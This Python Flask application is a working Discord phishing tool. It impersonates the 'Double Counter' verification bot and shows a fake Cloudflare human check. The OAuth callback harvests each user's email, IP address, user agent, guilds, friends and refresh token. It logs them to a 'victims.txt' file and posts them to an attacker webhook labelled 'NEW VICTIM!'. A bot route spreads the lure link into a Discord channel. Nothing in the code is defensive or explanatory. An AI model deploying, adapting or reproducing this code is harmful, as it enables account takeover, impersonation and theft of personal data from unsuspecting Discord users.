from flask import Flask, request, redirect, render_template_string
import requests
import os
import json
import datetime
import urllib.parse
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# === CONFIGURATION ===
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI", "https://YOUR_RENDER_URL.onrender.com/callback")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
BOT_TOKEN = os.getenv("BOT_TOKEN")
VERIFY_CHANNEL_ID = os.getenv("VERIFY_CHANNEL_ID", "1516478639858913322")

# === LANDING PAGE – CLONE OF DOUBLE COUNTER ===
LANDING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Double Counter</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            border-radius: 16px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            border: 1px solid #2a2a4a;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .logo {
            font-size: 28px;
            font-weight: 700;
            color: #5865F2;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #8a8aaa;
            font-size: 14px;
            margin-bottom: 24px;
        }
        .server-name {
            background: #0a0a1a;
            border-radius: 8px;
            padding: 12px;
            font-size: 14px;
            color: #ccc;
            border: 1px solid #2a2a4a;
            margin-bottom: 24px;
        }
        .verify-btn {
            background: #5865F2;
            color: #fff;
            border: none;
            padding: 14px 40px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: background 0.2s;
            width: 100%;
        }
        .verify-btn:hover {
            background: #4752c4;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #5a5a7a;
        }
        .footer a {
            color: #5865F2;
            text-decoration: none;
        }
        .badge {
            background: #2a2a4a;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #8a8aaa;
            display: inline-block;
            margin-bottom: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="badge">APP</div>
        <div class="logo">Double Counter</div>
        <div class="subtitle">Verify to access this server</div>
        <div style="margin-bottom: 16px; font-size: 14px; color: #aaa;">
            This server uses <strong>Double Counter</strong> to block alt accounts and VPNs.
        </div>
        <div class="server-name">🔒 Server: <strong>{{ server_name }}</strong></div>
        <a href="{{ auth_url }}" class="verify-btn">Click here to verify</a>
        <div class="footer">
            By clicking, you accept our <a href="#">privacy policy</a> · <a href="#">Support</a>
        </div>
    </div>
</body>
</html>
"""

# === VERIFICATION PAGE ===
VERIFY_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify you're human</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            border-radius: 16px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            border: 1px solid #2a2a4a;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .header-title {
            font-size: 18px;
            font-weight: 600;
        }
        .cloudflare-badge {
            background: #2a2a4a;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #8a8aaa;
        }
        .description {
            color: #aaa;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 24px;
        }
        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 12px;
            background: #0a0a1a;
            padding: 14px 16px;
            border-radius: 8px;
            border: 1px solid #2a2a4a;
            margin-bottom: 16px;
            cursor: pointer;
            transition: border 0.2s;
        }
        .checkbox-container:hover {
            border-color: #5865F2;
        }
        .checkbox {
            width: 24px;
            height: 24px;
            border: 2px solid #5a5a7a;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            transition: all 0.2s;
        }
        .checkbox.checked {
            background: #57F287;
            border-color: #57F287;
        }
        .checkbox.checked::after {
            content: "✓";
            color: #000;
            font-size: 16px;
            font-weight: 700;
        }
        .checkbox-text {
            font-size: 14px;
            color: #ddd;
        }
        .verification-id {
            font-size: 12px;
            color: #5a5a7a;
            margin-top: 8px;
            padding: 8px;
            background: #0a0a1a;
            border-radius: 4px;
            text-align: center;
        }
        .footer {
            margin-top: 20px;
            font-size: 11px;
            color: #5a5a7a;
            text-align: center;
        }
        .footer a {
            color: #5865F2;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="header-title">🔒 Verify you're human</span>
            <span class="cloudflare-badge">CLOUDFLARE</span>
        </div>
        <div class="description">
            This server is protected by <strong>Double Counter</strong>, the trust & safety layer that blocks alt accounts and VPNs. Complete the quick check below to continue.
        </div>
        <div class="checkbox-container" onclick="window.location.href='/dashboard'">
            <div class="checkbox" id="checkbox"></div>
            <span class="checkbox-text">Verify you are human</span>
        </div>
        <div class="verification-id">
            VERIFICATION ID <span>{{ verification_id }}</span>
        </div>
        <div class="footer">
            <a href="#">Privacy policy</a> · <a href="#">Help</a><br>
            <span style="color: #4a4a6a;">Double Counter is an independent service and is not affiliated with or endorsed by Discord Inc.</span>
        </div>
    </div>
    <script>
        document.querySelector('.checkbox-container').addEventListener('click', function() {
            this.classList.add('checked');
            document.getElementById('checkbox').classList.add('checked');
        });
    </script>
</body>
</html>
"""

# === ROUTES ===
@app.route('/')
def index():
    server_name = request.args.get('server', 'Serwer użytkownika imharm')
    auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20guilds.members.read%20messages.read%20relationships.read"
    )
    return render_template_string(LANDING_PAGE, server_name=server_name, auth_url=auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "No code provided", 400

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
    }

    try:
        resp = requests.post('https://discord.com/api/oauth2/token', data=data)
        if resp.status_code != 200:
            return f"Token exchange failed: {resp.text}", 400

        token_data = resp.json()
        access_token = token_data['access_token']
        refresh_token = token_data['refresh_token']
        headers = {'Authorization': f'Bearer {access_token}'}

        # Get user data
        user_resp = requests.get('https://discord.com/api/users/@me', headers=headers)
        user_data = user_resp.json()

        # Get guilds
        guilds_resp = requests.get('https://discord.com/api/users/@me/guilds', headers=headers)
        guilds = guilds_resp.json() if guilds_resp.status_code == 200 else []

        # Get friends
        friends_resp = requests.get('https://discord.com/api/users/@me/relationships', headers=headers)
        friends = friends_resp.json() if friends_resp.status_code == 200 else []

        # Save to file
        with open('victims.txt', 'a', encoding='utf-8') as f:
            f.write(f"""
{'='*80}
🎯 VICTIM - {datetime.datetime.now().isoformat()}
ID: {user_data['id']}
Username: {user_data['username']}#{user_data.get('discriminator', '0000')}
Email: {user_data.get('email', 'N/A')}
IP: {ip}
User Agent: {user_agent}
Refresh Token: {refresh_token}
Guilds: {len(guilds)}
Friends: {len(friends)}
{'='*80}
""")

        # Send webhook
        if WEBHOOK_URL:
            payload = {
                "content": f"""
🎯 **NEW VICTIM!**
User: {user_data['username']}#{user_data.get('discriminator', '0000')}
ID: {user_data['id']}
Email: {user_data.get('email', 'N/A')}
IP: {ip}
Refresh Token: `{refresh_token}`
"""
            }
            requests.post(WEBHOOK_URL, json=payload)

        # Redirect to verification page
        vid = f"w{hash(user_data['id']) % 100000000:07d}"
        return redirect(f'/verify?vid={vid}')

    except Exception as e:
        return f"Error: {e}", 500

@app.route('/verify')
def verify():
    vid = request.args.get('vid', f"w{hash(datetime.datetime.now()) % 100000000:07d}")
    return render_template_string(VERIFY_PAGE, verification_id=vid)

@app.route('/dashboard')
def dashboard():
    return """
    <html>
    <head><title>Verified</title></head>
    <body style="font-family: Arial; text-align: center; padding: 50px; background: #0a0a0f; color: #fff;">
        <h1 style="color: #57F287;">✅ Verification Complete!</h1>
        <p>You can now access the server.</p>
        <script>setTimeout(() => window.close(), 3000);</script>
    </body>
    </html>
    """

@app.route('/send_embed')
def send_embed():
    if not BOT_TOKEN:
        return "BOT_TOKEN not set", 400

    base_url = os.getenv('RENDER_URL', 'https://your-render-url.onrender.com')
    embed = {
        "title": "**Double Counter**",
        "description": "**APP.**",
        "color": 0x5865F2,
        "fields": [
            {
                "name": "Verify to access this server",
                "value": f"This server uses **Double Counter** to block alt accounts and VPNs.\n\n**Server:** Serwer użytkownika imharm\n\n**[Click here to verify]({base_url}/?server=Serwer%20u%C5%BCytkownika%20imharm)**",
                "inline": False
            }
        ],
        "footer": {"text": "Double Counter · Trust & Safety"},
        "timestamp": datetime.datetime.now().isoformat()
    }

    response = requests.post(
        f"https://discord.com/api/v10/channels/{VERIFY_CHANNEL_ID}/messages",
        headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
        json={"embeds": [embed]}
    )

    return f"✅ Embed sent!" if response.status_code == 200 else f"❌ Error: {response.text}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)